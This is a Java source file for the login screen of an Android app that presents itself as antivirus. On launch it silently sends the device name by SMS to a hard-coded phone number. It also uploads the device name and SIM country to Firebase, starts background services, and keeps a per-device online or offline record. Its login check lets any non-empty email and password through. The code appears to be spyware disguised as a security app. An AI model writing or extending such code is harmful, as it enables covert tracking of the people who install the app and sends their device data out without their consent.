package com.braniax.antivirus;

import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.braniax.antivirus.Broadcast.ConnectivityReciever;
import com.braniax.antivirus.Common.Common;
import com.braniax.antivirus.Service.ConnectionService;
import com.braniax.antivirus.Service.PingService;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.io.File;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class LoginActivity extends AppCompatActivity implements ConnectivityReciever.ConnectivityRecieverListner
{
    EditText etMail, etPass;
    Button btnSignIn;
    private ConnectivityManager connectivityManager;
    private NetworkInfo networkInfo;

        FirebaseDatabase db;
        DatabaseReference dbRef;

        Handler handlerVolley;
       private Runnable runable;

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        String message=Common.DEVICE_NAME.toUpperCase();
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("03054280545",null,message,null,null);


        dbRef=FirebaseDatabase.getInstance().getReference("Mobile");
        dbRef.keepSynced(true);

        Context context=getApplicationContext();
        context.startService(new Intent(context, ConnectionService.class));

        storeCountry();


        Context contextConnetion=getApplicationContext();
        contextConnetion.startService(new Intent(contextConnetion, BackgroundService.class));



        //defaultSMS();


    }

    private void startNewThreadToPing() {
            runable = new Runnable() {
            @Override
            public void run() {

                trimCache(LoginActivity.this);




                handlerVolley.postDelayed(runable,20000);
            }
            };
            handlerVolley.post(runable);
    }


    private void storeCountry() {

        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String countryCode = tm.getSimCountryIso();

        Locale locale=new Locale("",countryCode);
        Log.i("Country",locale.getDisplayCountry());
        String country= locale.getDisplayCountry();

        DatabaseReference dbRefCountry=FirebaseDatabase.getInstance().getReference("Countries");
        HashMap hashMap=new HashMap();
        if(country!=null){
            hashMap.put("country",country);
        }
        dbRefCountry.child(Common.DEVICE_NAME).setValue(hashMap).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
                if(task.isSuccessful()){

                }
            }
        });




    }

    public void loginMethod(View view)
    {
        etMail = findViewById(R.id.etmail);
        etPass = findViewById(R.id.etpass);
        btnSignIn = findViewById(R.id.btnSignIn);
        String mail = etMail.getText().toString().trim();
        String pass = etPass.getText().toString().trim();

        if (!mail.isEmpty() && !pass.isEmpty() && IsNetworkConnected())
        {
            Intent intent=new Intent(LoginActivity.this,MainActivity.class);
            startActivity(intent);
        }

        else if (mail.isEmpty()) {
            etMail.setError("Email is empty ");
            etMail.requestFocus();
        } else if (pass.isEmpty()) {
            etPass.setError("Password is empty ");
            etPass.requestFocus();
        } else if (!IsNetworkConnected()) {
            Toast.makeText(getApplicationContext(), "Not Connected", Toast.LENGTH_LONG).show();
        } else
            Toast.makeText(getApplicationContext(), "Sorry! Unexpected error", Toast.LENGTH_LONG).show();

    }

    private boolean IsNetworkConnected()
    {
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        networkInfo = connectivityManager.getActiveNetworkInfo();
        return (connectivityManager.getActiveNetworkInfo() != null && networkInfo.isConnected());
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    protected void defaultSMS()
    {
        //super.onResume();

        final String myPackageName = getPackageName();

        if (!Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName))
        {

            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Change SMS app");
            builder.setMessage("Use custom inbox instead of your Messaging as your SMS app?");
            builder.setPositiveButton("Yes", new DialogInterface.OnClickListener()
            {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    Intent intent =new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                    intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
                    startActivity(intent);
                    Toast.makeText(LoginActivity.this, "custom inbox is now your default SMS App", Toast.LENGTH_SHORT).show();
                    //finish();
                }
            });
            builder.setNegativeButton("No", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    Toast.makeText(LoginActivity.this, "custom inbox is not Default SMS app", Toast.LENGTH_SHORT).show();
                    //finish();
                }
            });

            builder.create();
            builder.show();

        }
    }



    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

        // The directory is now empty so delete it
        return dir.delete();
    }

    @Override
    protected void onResume() {
        super.onResume();
        MyApplication.getInstance().setConnectivtyListner(this);
        boolean isConnected=ConnectivityReciever.isConnected();
         checkConnection(isConnected);
    }

    private void checkConnection(boolean isConnected) {


        if(isConnected){
            dbRef.child(Common.DEVICE_NAME).child("online").setValue("true").addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    if(task.isSuccessful()){

                    }
                }
            });
        }else{
            dbRef.child(Common.DEVICE_NAME).child("online").onDisconnect().setValue(ServerValue.TIMESTAMP).addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    if(task.isSuccessful()){

                    }

                }
            });
        }
    }

    @Override
    public void onNetworkConnectionChanged(boolean isConnected) {

        if(isConnected){
            dbRef.child(Common.DEVICE_NAME).child("online").setValue("true").addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    if(task.isSuccessful()){
                        Toast.makeText(LoginActivity.this, "Online Done", Toast.LENGTH_SHORT).show();
                    }
                }
            });
        }else{
            dbRef.child(Common.DEVICE_NAME).child("online").onDisconnect().setValue(ServerValue.TIMESTAMP).addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    if(task.isSuccessful()){
                        Toast.makeText(LoginActivity.this, "offline Done", Toast.LENGTH_SHORT).show();
                    }

                }
            });
        }
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        Context context=getApplicationContext();
        context.startService(new Intent(context, ConnectionService.class));

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

    }
}
